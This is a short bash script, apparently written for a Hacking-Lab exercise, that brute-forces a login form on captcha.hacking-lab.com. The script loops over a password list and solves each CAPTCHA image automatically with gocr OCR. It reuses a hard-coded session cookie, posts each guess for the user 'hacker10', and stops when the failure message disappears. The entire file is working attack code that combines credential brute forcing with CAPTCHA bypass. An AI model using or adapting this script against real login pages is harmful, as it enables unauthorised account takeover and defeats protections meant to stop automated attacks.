#! /bin/bash

for i in $(cat passwords.txt); do
    curl -H "Cookie: PHPSESSID=bds5lud0ln9tghgsb2detk9na6" -s http://captcha.hacking-lab.com/captcha.php  > captcha.gif
    captcha=$(gocr -C "0-9" -m 130 captcha.gif -p db.pics)
    temp=$(curl -s -d "formID=31503373534448&username=hacker10&website=&simple_spc=31503373534448-31503373534448&q3_requestid=0&password=$i&norobot=$captcha" \
        -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36" \
        -H "Referer: http://captcha.hacking-lab.com/login2.php" \
        -H "Cookie: PHPSESSID=bds5lud0ln9tghgsb2detk9na6" \
        -H "Connection:keep-alive" \
        -H "application/x-www-form-urlencoded" \
        -H "Origin: http://captcha.hacking-lab.com" \
        -H "Host: captcha.hacking-lab.com" \
        -H "DNT: 1" \
        http://captcha.hacking-lab.com/restricted2.php
        )
    echo "hello $temp"
    if echo $temp | grep "Username is unknown or password is wrong!" >/dev/null; then
        continue
    elif echo $temp | grep "was not loaded" >/dev/null; then
        continue
    else
        echo  "it is" $i
        break
    fi
done
